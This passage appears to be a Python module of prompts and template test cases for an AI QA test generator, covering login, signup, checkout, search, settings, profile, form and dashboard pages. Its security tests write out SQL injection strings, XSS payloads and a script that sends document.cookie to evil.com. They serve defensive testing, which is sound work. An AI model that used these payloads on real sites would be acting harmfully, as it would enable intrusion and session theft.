"""
TestAI Agent - Expert QA Prompts

Prompts engineered to produce test cases that sound like
a senior QA engineer wrote them - not generic AI output.

Key Principles:
- Specific, not vague ("Enter 'test@email.com'" not "Enter valid email")
- Actionable steps anyone can follow
- Real test data, not placeholders
- Risk-aware prioritization
- Human reasoning visible
"""

from typing import Dict, List, Optional, Any


# The core system prompt - this defines the "personality" of test generation
EXPERT_QA_SYSTEM_PROMPT = """You are Maya, a senior QA engineer with 12 years of experience at companies like Stripe, Airbnb, and Google. You've caught bugs that would have cost millions. You're known for:

1. **Finding edge cases others miss** - You think like a user who's having a bad day
2. **Writing clear, actionable tests** - Your tests can be run by anyone
3. **Prioritizing ruthlessly** - You know what breaks in production
4. **Real test data** - You use specific values, not "valid input"

Your test cases are SPECIFIC:
- ❌ "Enter valid email" → ✅ "Enter 'john.doe+test@company.com'"
- ❌ "Submit form" → ✅ "Click the blue 'Sign In' button in the bottom right"
- ❌ "Check error message" → ✅ "Verify error shows: 'Invalid password. 2 attempts remaining.'"

Your priorities are RISK-BASED:
- CRITICAL: Data loss, security holes, payment failures
- HIGH: Core functionality broken, user can't complete main task
- MEDIUM: Annoyances, edge cases that affect <10% of users
- LOW: Polish, nice-to-haves, rare scenarios

Output JSON array. Each test must feel like a real QA engineer wrote it."""


def get_feature_prompt(
    feature: str,
    page_type: str,
    elements: Optional[List[Dict]] = None,
    knowledge: Optional[List[Any]] = None,
    context: Optional[str] = None,
) -> str:
    """
    Build a detailed prompt for test generation.

    This prompt guides the LLM to produce human-quality tests.
    """
    prompt_parts = []

    # Opening - set the context clearly
    prompt_parts.append(f"""
=== TEST GENERATION REQUEST ===

Feature: {feature}
Page Type: {page_type}

I need you to create comprehensive test cases for this feature.
Think about it from multiple angles: happy users, confused users,
malicious users, users with disabilities, users on slow connections.
""")

    # Add element context if available
    if elements:
        element_summary = _format_elements(elements)
        prompt_parts.append(f"""
=== PAGE ELEMENTS DETECTED ===
{element_summary}

Use these actual element names in your test steps.
""")

    # Add knowledge from brain
    if knowledge:
        knowledge_text = _format_knowledge(knowledge)
        prompt_parts.append(f"""
=== QA KNOWLEDGE BASE (FOLLOW THESE RULES) ===
{knowledge_text}

Apply these rules to your test cases.
""")

    # Add user context
    if context:
        prompt_parts.append(f"""
=== ADDITIONAL CONTEXT ===
{context}
""")

    # Add page-specific guidance
    page_guidance = PAGE_SPECIFIC_GUIDANCE.get(page_type.lower(), GENERIC_GUIDANCE)
    prompt_parts.append(f"""
=== {page_type.upper()} PAGE TESTING FOCUS ===
{page_guidance}
""")

    # Output requirements
    prompt_parts.append("""
=== OUTPUT REQUIREMENTS ===

Return a JSON array of test cases. Each test case MUST have:
{
  "id": "TC-001",
  "title": "Clear, specific title",
  "description": "Why this test matters (1 sentence)",
  "category": "happy_path|edge_case|negative|security|accessibility|boundary|error_handling",
  "priority": "critical|high|medium|low",
  "preconditions": ["List", "of", "setup", "requirements"],
  "steps": [
    "1. Specific action with exact values",
    "2. Another specific action",
    "3. Verification step"
  ],
  "expected_result": "Exact expected outcome with specific values",
  "test_data": {"key": "actual_value_to_use"}
}

Generate 10-15 test cases covering:
- 2-3 happy path scenarios
- 3-4 edge cases
- 2-3 negative tests
- 2-3 security tests
- 1-2 accessibility tests
- 1-2 boundary tests

Make them SPECIFIC and ACTIONABLE. No generic placeholders.
""")

    return "\n".join(prompt_parts)


def _format_elements(elements: List[Dict]) -> str:
    """Format elements in a useful way for the prompt."""
    lines = []

    for el in elements[:20]:  # Limit to avoid prompt overflow
        el_type = el.get("elementType", el.get("type", el.get("tag", "unknown")))
        name = el.get("name", el.get("id", ""))
        text = el.get("text", "")[:50]
        placeholder = el.get("placeholder", "")

        parts = [f"• {el_type}"]
        if name:
            parts.append(f'name="{name}"')
        if text:
            parts.append(f'text="{text}"')
        if placeholder:
            parts.append(f'placeholder="{placeholder}"')

        lines.append(" ".join(parts))

    if len(elements) > 20:
        lines.append(f"... and {len(elements) - 20} more elements")

    return "\n".join(lines)


def _format_knowledge(knowledge: List[Any]) -> str:
    """Format knowledge chunks for the prompt."""
    lines = []

    for i, chunk in enumerate(knowledge[:5]):  # Limit to top 5
        content = chunk.content if hasattr(chunk, 'content') else str(chunk)
        # Truncate long chunks
        if len(content) > 300:
            content = content[:300] + "..."
        lines.append(f"{i+1}. {content}")

    return "\n".join(lines)


# Page-specific guidance for better tests
PAGE_SPECIFIC_GUIDANCE = {
    "login": """
CRITICAL tests for login:
- SQL injection in email/username field
- Password field doesn't log input
- Account lockout after failed attempts
- "Remember me" doesn't expose credentials
- Session handling (logout everywhere)
- Brute force protection

COMMON EDGE CASES:
- Email with + character (john+test@email.com)
- Unicode in password (including emojis)
- Copy-paste password (shouldn't be blocked)
- Password managers (autofill should work)
- Multiple tabs/windows logged in
- Session timeout behavior

TEST DATA TO USE:
- Valid email: maya.test@company.com
- Valid password: TestPassword123!
- Invalid email: not-an-email
- SQL injection: ' OR '1'='1
- XSS attempt: <script>alert('xss')</script>
""",

    "signup": """
CRITICAL tests for signup:
- Email uniqueness check
- Password strength validation
- XSS in name fields
- Email verification flow
- Terms acceptance required
- Data persistence on page refresh

COMMON EDGE CASES:
- Very long names (100+ characters)
- Special characters in name (O'Brien, José)
- Already registered email
- Password mismatch
- International phone numbers
- Age verification edge (exactly 18)

TEST DATA TO USE:
- Valid name: Maya O'Brien-Müller
- Valid email: maya.signup.test@company.com
- Weak password: 123456
- Strong password: MyS3cur3P@ssw0rd!
- Existing email: already.exists@company.com
""",

    "checkout": """
CRITICAL tests for checkout:
- Payment data never logged
- Cart modifications during checkout
- Price tampering attempts
- Currency handling
- Order confirmation
- Double-submit prevention

COMMON EDGE CASES:
- Item goes out of stock during checkout
- Coupon code edge cases (expired, single-use)
- Address validation for different countries
- Tax calculation changes
- Shipping to PO Box

TEST DATA TO USE:
- Test card: 4242424242424242
- Expired card: 4000000000000069
- Declined card: 4000000000000002
- Invalid CVV: 99999
- Valid coupon: TESTDISCOUNT20
- Expired coupon: EXPIREDCODE
""",

    "search": """
CRITICAL tests for search:
- XSS in search input
- SQL injection attempts
- Empty results handling
- Search performance (response time)
- Special characters handling

COMMON EDGE CASES:
- Very long search queries (1000+ chars)
- Unicode and emoji in search
- Search with only spaces
- Boolean operators (AND, OR, NOT)
- Partial matching
- Search history

TEST DATA TO USE:
- Normal query: "blue running shoes"
- Long query: "a" * 1000
- XSS: <script>alert(1)</script>
- SQL: ' OR '1'='1' --
- Unicode: "日本語検索"
- Emoji: "🏃 shoes"
""",

    "form": """
CRITICAL tests for forms:
- Required field validation
- Input sanitization
- File upload security (if applicable)
- Form state persistence
- Submission error handling

COMMON EDGE CASES:
- Submit with all fields empty
- Maximum length inputs
- Special characters in all fields
- Form timeout/session expiry
- Back button after submit

TEST DATA TO USE:
- Empty string: ""
- Max length: "a" * 255
- SQL injection: '; DROP TABLE users; --
- HTML injection: <b>bold</b>
- Script injection: javascript:alert(1)
""",

    "settings": """
CRITICAL tests for settings:
- Password change requires current password
- Sensitive changes need re-authentication
- Account deletion has safeguards
- Privacy settings actually take effect
- Data export works correctly

COMMON EDGE CASES:
- Change email to already-used email
- Cancel changes reverts properly
- Concurrent changes from multiple devices
- Settings persist after logout/login
- Timezone changes affect displayed dates

TEST DATA TO USE:
- Current password: OldPassword123!
- New password: NewSecure456!
- Weak password: 123456
- XSS in name: <script>alert(1)</script>
- Unicode name: 日本語名前
""",

    "profile": """
CRITICAL tests for profile:
- File upload validates file type (not just extension)
- XSS prevention in all text fields
- Private fields not visible to others
- Image sizes are validated
- Profile URL doesn't expose user IDs insecurely

COMMON EDGE CASES:
- Bio with maximum characters
- Special characters in name (O'Brien, José)
- Avatar with transparency
- Very large images (10MB+)
- Profile with no optional fields filled

TEST DATA TO USE:
- Valid name: Maya O'Brien-Müller
- Max bio: "a" * 500
- XSS bio: <script>alert(1)</script>
- Valid avatar: 500KB JPG, 400x400
- Invalid avatar: 15MB PNG
""",

    "dashboard": """
CRITICAL tests for dashboard:
- Data isolation (user sees only their data)
- Refresh updates without page reload
- Slow API doesn't break layout
- Error states handled gracefully
- Statistics are accurate

COMMON EDGE CASES:
- New user with no data (empty state)
- User with large amounts of data
- Multiple browser tabs open
- Concurrent updates from other sessions
- Widget loading order

TEST DATA TO USE:
- New user: fresh.user@test.com
- Power user: has 1000+ items
- Expected refresh interval: 30 seconds
""",

    "list": """
CRITICAL tests for list/table views:
- Pagination works correctly
- Sorting doesn't break data
- Filters combine properly
- Selection state persists
- Bulk actions affect only selected

COMMON EDGE CASES:
- Empty list state
- Single item in list
- Exactly page boundary (10, 20, 50 items)
- Filter returning no results
- Sort by empty/null values

TEST DATA TO USE:
- Page sizes: 10, 25, 50, 100
- Sort columns: name, date, status
- Filter values: active, pending, completed
""",
}

GENERIC_GUIDANCE = """
UNIVERSAL TESTING FOCUS:
- Input validation on all fields
- Error message clarity
- Loading states and timeouts
- Mobile responsiveness
- Keyboard navigation
- Screen reader compatibility

ALWAYS CHECK:
- Empty inputs
- Maximum length inputs
- Special characters
- HTML/script injection
- Error recovery
- State persistence
"""


# Templates for when no LLM is available
HUMAN_QUALITY_TEMPLATES = {
    "login": [
        {
            "id": "TC-001",
            "title": "Successful login with valid credentials",
            "description": "Verify users can log in with correct email and password",
            "category": "happy_path",
            "priority": "critical",
            "preconditions": [
                "User account exists with email: maya.test@company.com",
                "Password is: TestPassword123!",
                "User is on the login page"
            ],
            "steps": [
                "1. Enter 'maya.test@company.com' in the email field",
                "2. Enter 'TestPassword123!' in the password field",
                "3. Click the 'Sign In' button",
                "4. Wait for the page to load (max 3 seconds)"
            ],
            "expected_result": "User is redirected to dashboard. Welcome message shows 'Hello, Maya'",
            "test_data": {
                "email": "maya.test@company.com",
                "password": "TestPassword123!"
            }
        },
        {
            "id": "TC-002",
            "title": "Login fails with incorrect password",
            "description": "Ensure proper error handling for wrong password",
            "category": "negative",
            "priority": "high",
            "preconditions": [
                "User account exists with email: maya.test@company.com",
                "User is on the login page"
            ],
            "steps": [
                "1. Enter 'maya.test@company.com' in the email field",
                "2. Enter 'WrongPassword123!' in the password field",
                "3. Click the 'Sign In' button"
            ],
            "expected_result": "Error message appears: 'Invalid email or password'. Password field is cleared. Email field retains value.",
            "test_data": {
                "email": "maya.test@company.com",
                "password": "WrongPassword123!"
            }
        },
        {
            "id": "TC-003",
            "title": "SQL injection attempt in email field",
            "description": "Verify login is protected against SQL injection attacks",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is on the login page"],
            "steps": [
                "1. Enter ' OR '1'='1' -- in the email field",
                "2. Enter 'anything' in the password field",
                "3. Click the 'Sign In' button"
            ],
            "expected_result": "Login fails with 'Invalid email format' error. No database error is exposed. Login attempt is logged.",
            "test_data": {
                "email": "' OR '1'='1' --",
                "password": "anything"
            }
        },
        {
            "id": "TC-004",
            "title": "Account lockout after 5 failed attempts",
            "description": "Verify brute force protection is working",
            "category": "security",
            "priority": "critical",
            "preconditions": [
                "User account exists with email: maya.test@company.com",
                "Account is not currently locked"
            ],
            "steps": [
                "1. Enter 'maya.test@company.com' in the email field",
                "2. Enter 'WrongPass1' and click Sign In",
                "3. Repeat step 2 with 'WrongPass2', 'WrongPass3', 'WrongPass4', 'WrongPass5'",
                "4. On the 6th attempt, enter the CORRECT password"
            ],
            "expected_result": "After 5 failures, account is locked. Message shows: 'Account locked. Please try again in 15 minutes or reset your password.'",
            "test_data": {
                "email": "maya.test@company.com",
                "wrong_passwords": ["WrongPass1", "WrongPass2", "WrongPass3", "WrongPass4", "WrongPass5"]
            }
        },
        {
            "id": "TC-005",
            "title": "Login with email containing plus sign",
            "description": "Email aliases with + should work correctly",
            "category": "edge_case",
            "priority": "medium",
            "preconditions": [
                "User account exists with email: maya.test+alias@company.com",
                "User is on the login page"
            ],
            "steps": [
                "1. Enter 'maya.test+alias@company.com' in the email field",
                "2. Enter 'TestPassword123!' in the password field",
                "3. Click the 'Sign In' button"
            ],
            "expected_result": "Login succeeds. Email is correctly recognized as maya.test+alias@company.com",
            "test_data": {
                "email": "maya.test+alias@company.com",
                "password": "TestPassword123!"
            }
        },
    ],

    "signup": [
        {
            "id": "TC-001",
            "title": "Successful registration with valid data",
            "description": "Verify new users can create an account",
            "category": "happy_path",
            "priority": "critical",
            "preconditions": ["User is on the registration page", "Email is not already registered"],
            "steps": [
                "1. Enter 'Maya' in the first name field",
                "2. Enter 'O'Brien' in the last name field",
                "3. Enter 'maya.new.user@company.com' in the email field",
                "4. Enter 'SecurePass123!' in the password field",
                "5. Enter 'SecurePass123!' in the confirm password field",
                "6. Check the 'I agree to Terms of Service' checkbox",
                "7. Click the 'Create Account' button"
            ],
            "expected_result": "Account created successfully. User sees confirmation message and verification email is sent.",
            "test_data": {
                "first_name": "Maya",
                "last_name": "O'Brien",
                "email": "maya.new.user@company.com",
                "password": "SecurePass123!"
            }
        },
        {
            "id": "TC-002",
            "title": "Registration with already existing email",
            "description": "Prevent duplicate accounts with same email",
            "category": "edge_case",
            "priority": "high",
            "preconditions": ["Email 'existing@company.com' is already registered"],
            "steps": [
                "1. Fill in all required fields with valid data",
                "2. Enter 'existing@company.com' in the email field",
                "3. Click 'Create Account'"
            ],
            "expected_result": "Error message: 'An account with this email already exists. Please sign in or use a different email.'",
            "test_data": {
                "email": "existing@company.com"
            }
        },
        {
            "id": "TC-003",
            "title": "XSS attempt in name field",
            "description": "Name field should sanitize malicious input",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is on the registration page"],
            "steps": [
                "1. Enter '<script>alert(\"XSS\")</script>' in the first name field",
                "2. Complete other fields with valid data",
                "3. Submit the form",
                "4. View the profile page after registration"
            ],
            "expected_result": "Script tags are escaped or removed. Profile shows escaped text, not executed script. No alert box appears.",
            "test_data": {
                "first_name": "<script>alert(\"XSS\")</script>"
            }
        },
    ],

    "checkout": [
        {
            "id": "TC-001",
            "title": "Complete purchase with valid card",
            "description": "Verify end-to-end checkout flow works",
            "category": "happy_path",
            "priority": "critical",
            "preconditions": [
                "User is logged in",
                "Cart has at least one item",
                "User is on checkout page"
            ],
            "steps": [
                "1. Verify cart summary shows correct items and total",
                "2. Enter shipping address: 123 Test St, San Francisco, CA 94102",
                "3. Select 'Standard Shipping' option",
                "4. Enter card number: 4242424242424242",
                "5. Enter expiry: 12/25",
                "6. Enter CVV: 123",
                "7. Click 'Place Order'",
                "8. Wait for confirmation (max 10 seconds)"
            ],
            "expected_result": "Order confirmation page shows. Order number is displayed. Confirmation email is sent. Cart is emptied.",
            "test_data": {
                "card_number": "4242424242424242",
                "expiry": "12/25",
                "cvv": "123",
                "address": "123 Test St, San Francisco, CA 94102"
            }
        },
        {
            "id": "TC-002",
            "title": "Payment fails with declined card",
            "description": "Verify proper handling of declined payments",
            "category": "negative",
            "priority": "high",
            "preconditions": ["User is on checkout page with items in cart"],
            "steps": [
                "1. Enter declined test card: 4000000000000002",
                "2. Enter valid expiry and CVV",
                "3. Click 'Place Order'"
            ],
            "expected_result": "Error message: 'Your card was declined. Please try a different payment method.' Card details are cleared. Order is NOT placed.",
            "test_data": {
                "card_number": "4000000000000002"
            }
        },
    ],

    "search": [
        {
            "id": "TC-001",
            "title": "Search returns relevant results for valid query",
            "description": "Verify basic search functionality works correctly",
            "category": "happy_path",
            "priority": "critical",
            "preconditions": [
                "User is on the search page or page with search functionality",
                "Test data exists in the system matching 'blue running shoes'"
            ],
            "steps": [
                "1. Click on the search input field",
                "2. Enter 'blue running shoes'",
                "3. Press Enter or click the search icon",
                "4. Wait for results to load (max 3 seconds)"
            ],
            "expected_result": "Results page shows items containing 'blue', 'running', or 'shoes'. Result count is displayed. Results are sorted by relevance.",
            "test_data": {
                "query": "blue running shoes",
                "expected_min_results": 1
            }
        },
        {
            "id": "TC-002",
            "title": "Search with no results displays friendly message",
            "description": "Verify proper handling when no results found",
            "category": "edge_case",
            "priority": "high",
            "preconditions": ["User is on the search page"],
            "steps": [
                "1. Enter 'xyznonexistent12345' in the search field",
                "2. Click search or press Enter"
            ],
            "expected_result": "Message shows: 'No results found for \"xyznonexistent12345\"'. Suggestions shown: 'Try different keywords' or 'Browse categories'.",
            "test_data": {
                "query": "xyznonexistent12345"
            }
        },
        {
            "id": "TC-003",
            "title": "XSS injection attempt in search field",
            "description": "Search field must sanitize malicious input",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is on the search page"],
            "steps": [
                "1. Enter '<script>alert(\"XSS\")</script>' in the search field",
                "2. Click search",
                "3. Observe the results page and URL"
            ],
            "expected_result": "No alert box appears. Script tags are HTML-encoded in the URL and page. Query is displayed as plain text, not executed.",
            "test_data": {
                "query": "<script>alert(\"XSS\")</script>"
            }
        },
        {
            "id": "TC-004",
            "title": "SQL injection attempt in search",
            "description": "Search must be protected against SQL injection",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is on the search page"],
            "steps": [
                "1. Enter ' OR '1'='1' -- in the search field",
                "2. Submit the search",
                "3. Check if unexpected data is returned"
            ],
            "expected_result": "Normal 'no results' or filtered results. No database error shown. No unauthorized data exposed.",
            "test_data": {
                "query": "' OR '1'='1' --"
            }
        },
        {
            "id": "TC-005",
            "title": "Search with special characters",
            "description": "Special characters should be handled gracefully",
            "category": "edge_case",
            "priority": "medium",
            "preconditions": ["User is on the search page"],
            "steps": [
                "1. Enter '@#$%^&*()' in the search field",
                "2. Submit the search"
            ],
            "expected_result": "No error occurs. Either shows results or 'no results' message. Special characters are properly escaped.",
            "test_data": {
                "query": "@#$%^&*()"
            }
        },
        {
            "id": "TC-006",
            "title": "Search with Unicode and emoji",
            "description": "International characters and emoji should work",
            "category": "edge_case",
            "priority": "medium",
            "preconditions": ["User is on the search page"],
            "steps": [
                "1. Enter '日本語 🏃 shoes' in the search field",
                "2. Submit the search"
            ],
            "expected_result": "Search processes without error. Unicode and emoji are displayed correctly in search field and results.",
            "test_data": {
                "query": "日本語 🏃 shoes"
            }
        },
        {
            "id": "TC-007",
            "title": "Search with very long query",
            "description": "System should handle extremely long input",
            "category": "boundary",
            "priority": "low",
            "preconditions": ["User is on the search page"],
            "steps": [
                "1. Enter a 1000-character string in the search field",
                "2. Submit the search"
            ],
            "expected_result": "Either input is truncated to max length, or search completes without timeout/error. No server crash.",
            "test_data": {
                "query": "a" * 1000,
                "note": "1000 character string"
            }
        },
    ],

    "settings": [
        {
            "id": "TC-001",
            "title": "Update profile name successfully",
            "description": "Verify user can change their display name",
            "category": "happy_path",
            "priority": "high",
            "preconditions": [
                "User is logged in",
                "User is on the settings page"
            ],
            "steps": [
                "1. Navigate to 'Profile' or 'Account' section",
                "2. Locate the 'Display Name' field",
                "3. Clear the field and enter 'Maya Updated'",
                "4. Click 'Save Changes'",
                "5. Refresh the page"
            ],
            "expected_result": "Success message: 'Profile updated successfully'. Name shows 'Maya Updated' after refresh. Name updated in header/navbar.",
            "test_data": {
                "new_name": "Maya Updated"
            }
        },
        {
            "id": "TC-002",
            "title": "Change password with correct current password",
            "description": "Verify password change flow works",
            "category": "happy_path",
            "priority": "critical",
            "preconditions": [
                "User is logged in with password 'OldPassword123!'",
                "User is on the settings page"
            ],
            "steps": [
                "1. Navigate to 'Security' or 'Password' section",
                "2. Enter 'OldPassword123!' in 'Current Password' field",
                "3. Enter 'NewSecure456!' in 'New Password' field",
                "4. Enter 'NewSecure456!' in 'Confirm Password' field",
                "5. Click 'Change Password'",
                "6. Log out and log back in with new password"
            ],
            "expected_result": "Success message shown. Old password no longer works. New password 'NewSecure456!' works for login.",
            "test_data": {
                "current_password": "OldPassword123!",
                "new_password": "NewSecure456!"
            }
        },
        {
            "id": "TC-003",
            "title": "Change password fails with wrong current password",
            "description": "Must verify current password before allowing change",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is logged in", "User is on settings page"],
            "steps": [
                "1. Navigate to password change section",
                "2. Enter 'WrongCurrentPass!' in 'Current Password'",
                "3. Enter valid new password",
                "4. Click 'Change Password'"
            ],
            "expected_result": "Error: 'Current password is incorrect'. Password is NOT changed. No hint about correct password.",
            "test_data": {
                "wrong_current": "WrongCurrentPass!"
            }
        },
        {
            "id": "TC-004",
            "title": "Email notification toggle persists",
            "description": "Verify notification preferences are saved",
            "category": "happy_path",
            "priority": "medium",
            "preconditions": ["User is logged in", "Email notifications are ON"],
            "steps": [
                "1. Navigate to 'Notifications' section",
                "2. Toggle 'Email notifications' to OFF",
                "3. Click 'Save'",
                "4. Navigate away from settings",
                "5. Return to settings page"
            ],
            "expected_result": "Email notifications toggle shows OFF after returning. No notification emails sent after toggle off.",
            "test_data": {}
        },
        {
            "id": "TC-005",
            "title": "XSS attempt in display name field",
            "description": "Settings fields must sanitize input",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is logged in", "User is on settings page"],
            "steps": [
                "1. Enter '<img src=x onerror=alert(1)>' in display name",
                "2. Save changes",
                "3. View profile page where name is displayed"
            ],
            "expected_result": "Input is sanitized. No alert popup. Name displays as plain text or is rejected.",
            "test_data": {
                "malicious_name": "<img src=x onerror=alert(1)>"
            }
        },
        {
            "id": "TC-006",
            "title": "Cancel changes reverts to original values",
            "description": "Cancel button should discard unsaved changes",
            "category": "edge_case",
            "priority": "medium",
            "preconditions": [
                "User is logged in",
                "Display name is 'Original Name'"
            ],
            "steps": [
                "1. Change display name to 'Changed Name'",
                "2. Click 'Cancel' button",
                "3. Check the name field"
            ],
            "expected_result": "Name field shows 'Original Name'. No changes are saved. No confirmation message.",
            "test_data": {
                "original": "Original Name",
                "changed": "Changed Name"
            }
        },
        {
            "id": "TC-007",
            "title": "Delete account requires confirmation",
            "description": "Account deletion should have safeguards",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is logged in", "User is on settings page"],
            "steps": [
                "1. Navigate to 'Danger Zone' or 'Delete Account' section",
                "2. Click 'Delete Account'",
                "3. Observe the confirmation dialog"
            ],
            "expected_result": "Confirmation dialog appears. Must type 'DELETE' or email to confirm. Must re-enter password. Option to cancel.",
            "test_data": {}
        },
    ],

    "profile": [
        {
            "id": "TC-001",
            "title": "View own profile displays correct information",
            "description": "Verify profile page shows user's data correctly",
            "category": "happy_path",
            "priority": "high",
            "preconditions": [
                "User is logged in as maya.test@company.com",
                "Profile has name: Maya Test, bio: 'QA Engineer'"
            ],
            "steps": [
                "1. Click on profile avatar or 'My Profile' link",
                "2. Wait for profile page to load"
            ],
            "expected_result": "Profile shows: Name 'Maya Test', Email 'maya.test@company.com', Bio 'QA Engineer'. Avatar displays correctly.",
            "test_data": {
                "name": "Maya Test",
                "email": "maya.test@company.com",
                "bio": "QA Engineer"
            }
        },
        {
            "id": "TC-002",
            "title": "Upload profile picture with valid image",
            "description": "Verify image upload works correctly",
            "category": "happy_path",
            "priority": "medium",
            "preconditions": ["User is logged in", "User is on profile/edit page"],
            "steps": [
                "1. Click 'Change Photo' or avatar edit button",
                "2. Select a valid JPG file (500KB, 400x400px)",
                "3. Confirm or crop if required",
                "4. Save changes"
            ],
            "expected_result": "Image uploads successfully. Preview shows new image. New avatar appears in navbar. Old image is replaced.",
            "test_data": {
                "file_type": "image/jpeg",
                "file_size": "500KB",
                "dimensions": "400x400"
            }
        },
        {
            "id": "TC-003",
            "title": "Upload profile picture with oversized file",
            "description": "Large files should be rejected with clear message",
            "category": "edge_case",
            "priority": "medium",
            "preconditions": ["User is logged in", "User is on profile edit page"],
            "steps": [
                "1. Click 'Change Photo'",
                "2. Select a 15MB PNG file"
            ],
            "expected_result": "Error message: 'File too large. Maximum size is 5MB.' File is not uploaded. Existing avatar unchanged.",
            "test_data": {
                "file_size": "15MB",
                "max_allowed": "5MB"
            }
        },
        {
            "id": "TC-004",
            "title": "Upload malicious file disguised as image",
            "description": "File upload must validate actual file content",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is logged in", "User is on profile edit page"],
            "steps": [
                "1. Rename a PHP file to 'avatar.jpg'",
                "2. Attempt to upload as profile picture"
            ],
            "expected_result": "Upload rejected: 'Invalid file type'. Server validates file headers, not just extension. File is not saved.",
            "test_data": {
                "actual_type": "application/x-php",
                "fake_extension": ".jpg"
            }
        },
        {
            "id": "TC-005",
            "title": "Bio field handles maximum character limit",
            "description": "Bio should enforce length limits gracefully",
            "category": "boundary",
            "priority": "low",
            "preconditions": ["User is logged in", "Bio field allows 500 chars max"],
            "steps": [
                "1. Navigate to profile edit",
                "2. Enter exactly 500 characters in bio",
                "3. Try to enter 501st character",
                "4. Save with 500 characters"
            ],
            "expected_result": "At 500 chars, either input stops or counter shows limit. 501st char is prevented or trimmed. Save succeeds with 500 chars.",
            "test_data": {
                "bio_500": "a" * 500,
                "max_length": 500
            }
        },
        {
            "id": "TC-006",
            "title": "XSS in bio field is sanitized",
            "description": "Bio field must prevent script injection",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is logged in"],
            "steps": [
                "1. Enter '<script>document.location=\"http://evil.com/steal?c=\"+document.cookie</script>' in bio",
                "2. Save profile",
                "3. View profile (both own and public view)"
            ],
            "expected_result": "Script is not executed. Bio shows escaped text or is rejected. Cookies are not exposed.",
            "test_data": {
                "malicious_bio": "<script>document.location=\"http://evil.com/steal?c=\"+document.cookie</script>"
            }
        },
        {
            "id": "TC-007",
            "title": "Profile is accessible via keyboard navigation",
            "description": "Profile page should be fully keyboard navigable",
            "category": "accessibility",
            "priority": "medium",
            "preconditions": ["User is logged in", "User is on profile page"],
            "steps": [
                "1. Press Tab to focus first interactive element",
                "2. Continue tabbing through all elements",
                "3. Press Enter on 'Edit Profile' button",
                "4. Tab through form fields",
                "5. Press Escape to close any dialogs"
            ],
            "expected_result": "All interactive elements are focusable. Focus order is logical (top to bottom, left to right). Focus indicator is visible.",
            "test_data": {}
        },
    ],

    "form": [
        {
            "id": "TC-001",
            "title": "Submit form with all valid data",
            "description": "Verify form submission works with correct inputs",
            "category": "happy_path",
            "priority": "critical",
            "preconditions": ["User is on the form page", "All required fields are empty"],
            "steps": [
                "1. Enter 'Maya Test' in the name field",
                "2. Enter 'maya.form@company.com' in the email field",
                "3. Enter '555-123-4567' in the phone field",
                "4. Select an option from dropdown if present",
                "5. Click 'Submit' button"
            ],
            "expected_result": "Form submits successfully. Confirmation message appears. Data is saved correctly.",
            "test_data": {
                "name": "Maya Test",
                "email": "maya.form@company.com",
                "phone": "555-123-4567"
            }
        },
        {
            "id": "TC-002",
            "title": "Submit form with empty required fields",
            "description": "Required fields must show validation errors",
            "category": "negative",
            "priority": "high",
            "preconditions": ["User is on the form page"],
            "steps": [
                "1. Leave all fields empty",
                "2. Click 'Submit' button"
            ],
            "expected_result": "Form does NOT submit. Each required field shows error message. First error field is focused. Errors are red/visible.",
            "test_data": {}
        },
        {
            "id": "TC-003",
            "title": "Email field validates format",
            "description": "Invalid email formats should be rejected",
            "category": "negative",
            "priority": "high",
            "preconditions": ["User is on form page with email field"],
            "steps": [
                "1. Enter 'not-an-email' in email field",
                "2. Click outside the field or submit"
            ],
            "expected_result": "Error message: 'Please enter a valid email address'. Field is highlighted. Form does not submit.",
            "test_data": {
                "invalid_email": "not-an-email"
            }
        },
        {
            "id": "TC-004",
            "title": "Form data persists on validation error",
            "description": "User shouldn't lose entered data on error",
            "category": "edge_case",
            "priority": "medium",
            "preconditions": ["User is on form page"],
            "steps": [
                "1. Fill in all fields with valid data",
                "2. Clear one required field",
                "3. Submit the form",
                "4. Check values in other fields"
            ],
            "expected_result": "Only the empty required field shows error. All other entered values are preserved. User can fix error and submit.",
            "test_data": {}
        },
        {
            "id": "TC-005",
            "title": "SQL injection in text fields",
            "description": "Form must be protected against SQL injection",
            "category": "security",
            "priority": "critical",
            "preconditions": ["User is on form page"],
            "steps": [
                "1. Enter '; DROP TABLE users; --' in name field",
                "2. Fill other required fields with valid data",
                "3. Submit the form"
            ],
            "expected_result": "Form either rejects special characters or properly escapes them. No database error. Data is stored safely.",
            "test_data": {
                "malicious_input": "'; DROP TABLE users; --"
            }
        },
        {
            "id": "TC-006",
            "title": "Form handles server timeout gracefully",
            "description": "Slow network should not lose user data",
            "category": "error_handling",
            "priority": "medium",
            "preconditions": ["User is on form page", "Network is throttled to slow 3G"],
            "steps": [
                "1. Fill in all fields with valid data",
                "2. Submit the form",
                "3. Wait for timeout (30+ seconds)"
            ],
            "expected_result": "Loading indicator shown during wait. On timeout, error message: 'Request timed out. Please try again.' Form data is preserved.",
            "test_data": {}
        },
        {
            "id": "TC-007",
            "title": "Double-submit prevention",
            "description": "Form should not submit twice if button clicked rapidly",
            "category": "edge_case",
            "priority": "high",
            "preconditions": ["User is on form page with valid data"],
            "steps": [
                "1. Fill in all required fields",
                "2. Rapidly click 'Submit' button 3 times"
            ],
            "expected_result": "Only ONE submission is processed. Button is disabled after first click or shows loading state. No duplicate entries created.",
            "test_data": {}
        },
    ],

    "dashboard": [
        {
            "id": "TC-001",
            "title": "Dashboard loads with correct user data",
            "description": "Verify dashboard displays personalized content",
            "category": "happy_path",
            "priority": "critical",
            "preconditions": [
                "User is logged in as maya.test@company.com",
                "User has 5 recent activities"
            ],
            "steps": [
                "1. Navigate to dashboard (usually /dashboard or home after login)",
                "2. Wait for all widgets to load (max 5 seconds)"
            ],
            "expected_result": "Welcome message shows user's name. Recent activities show latest 5 items. Statistics/metrics are current. No loading spinners stuck.",
            "test_data": {
                "user": "maya.test@company.com",
                "expected_activities": 5
            }
        },
        {
            "id": "TC-002",
            "title": "Dashboard widgets handle empty state",
            "description": "New users should see helpful empty states",
            "category": "edge_case",
            "priority": "medium",
            "preconditions": [
                "User is logged in with new account",
                "No data/activities yet"
            ],
            "steps": [
                "1. Login with new account",
                "2. Navigate to dashboard"
            ],
            "expected_result": "Empty state messages are helpful: 'No activities yet. Start by...' or 'Create your first project'. No errors or broken layouts.",
            "test_data": {}
        },
